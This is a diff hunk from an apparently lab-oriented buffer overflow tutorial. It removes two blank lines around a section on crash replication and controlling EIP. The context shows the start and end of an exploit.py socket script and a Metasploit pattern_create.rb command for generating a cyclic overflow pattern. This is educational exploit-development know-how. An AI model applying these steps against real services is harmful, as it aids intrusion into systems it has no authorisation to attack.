@@ -89,7 +89,6 @@ while True:
 ### [](#header-3)Crash Replication & Controlling EIP
 
 1. Create another file ``exploit.py`` with the following:
-
 ```shell
 import socket
 
@@ -116,7 +115,6 @@ try:
 except:
   print("Could not connect.")
 ```
-
 2. Run the following command to generate a cyclic pattern of a length 400 bytes longer than the string that crashed the server.
 - ``/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400``
 3. we copy the output and place it into the payload variable of the ``exploit.py`` script 
